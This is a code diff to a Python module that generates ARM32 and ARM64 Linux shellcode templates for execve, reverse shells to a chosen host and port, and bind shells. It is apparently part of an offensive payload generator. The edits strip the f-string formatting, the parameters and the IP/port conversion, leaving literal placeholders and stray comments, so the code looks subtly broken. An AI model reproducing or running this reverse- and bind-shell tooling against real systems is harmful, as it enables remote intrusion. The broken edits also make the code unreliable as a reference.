@@ -7,7 +7,7 @@ Handles generation of Linux shellgen with:
 - Support for x86, x64, ARM32, and ARM64 architectures
 """
 
-from ..encoders import encode_dword, encode_qword, string_to_push_dwords
+from ..encoders import encode_dword, encode_qword
 
 
 class LinuxGenerator:
@@ -68,7 +68,7 @@ class LinuxGenerator:
 
     def gen_execve_arm32(self, command):
         """Generate ARM32 execve shellgen."""
-        return f"""; ==========================================================================
+        return """; ==========================================================================
 ; ARM32 Linux execve shellgen
 ; Command: {command}
 ; ==========================================================================
@@ -89,9 +89,9 @@ command:
     .asciz "{command}"
 """
 
-    def gen_execve_arm64(self, command):
+    def gen_execve_arm64(self):
         """Generate ARM64 execve shellgen."""
-        return f"""; ==========================================================================
+        return """; ==========================================================================
 ; ARM64 Linux execve shellgen
 ; Command: {command}
 ; ==========================================================================
@@ -111,16 +111,9 @@ command:
     .asciz "{command}"
 """
 
-    def gen_reverse_shell_arm32(self, host, port):
+    def gen_reverse_shell_arm32(self):
         """Generate ARM32 reverse shell shellgen."""
-        # Convert IP address to hex
-        ip_parts = [int(x) for x in host.split(".")]
-        ip_hex = (
-            (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
-        )
-        port_hex = (port >> 8) | ((port & 0xFF) << 8)  # Network byte order
-
-        return f"""; ==========================================================================
+        return """; ==========================================================================
 ; ARM32 Linux Reverse Shell
 ; Target: {host}:{port}
 ; ==========================================================================
@@ -179,16 +172,11 @@ binsh:
     .asciz "/bin/sh"
 """
 
-    def gen_reverse_shell_arm64(self, host, port):
+    def gen_reverse_shell_arm64(self):
         """Generate ARM64 reverse shell shellgen."""
         # Convert IP address to hex
-        ip_parts = [int(x) for x in host.split(".")]
-        ip_hex = (
-            (ip_parts[0] << 24) | (ip_parts[1] << 16) | (ip_parts[2] << 8) | ip_parts[3]
-        )
-        port_hex = (port >> 8) | ((port & 0xFF) << 8)  # Network byte order
 
-        return f"""; ==========================================================================
+        return """; ==========================================================================
 ; ARM64 Linux Reverse Shell
 ; Target: {host}:{port}
 ; ==========================================================================
@@ -247,13 +235,10 @@ binsh:
     .asciz "/bin/sh"
 """
 
-    def gen_bind_shell_arm32(self, port, shell="/bin/sh"):
+    def gen_bind_shell_arm32(self):
         """Generate ARM32 bind shell shellgen."""
-        # Convert port to network byte order
-        port_high = (port >> 8) & 0xFF
-        port_low = port & 0xFF
 
-        return f"""; ==========================================================================
+        return """; ==========================================================================
 ; ARM32 Linux bind shell
 ; Port: {port}
 ; Shell: {shell}
@@ -331,10 +316,7 @@ shell:
     def gen_bind_shell_arm64(self, port, shell="/bin/sh"):
         """Generate ARM64 bind shell shellgen."""
         # Convert port to network byte order
-        port_high = (port >> 8) & 0xFF
-        port_low = port & 0xFF
-
-        return f"""; ==========================================================================
+        return """; ==========================================================================
 ; ARM64 Linux bind shell
 ; Port: {port}
 ; Shell: {shell}
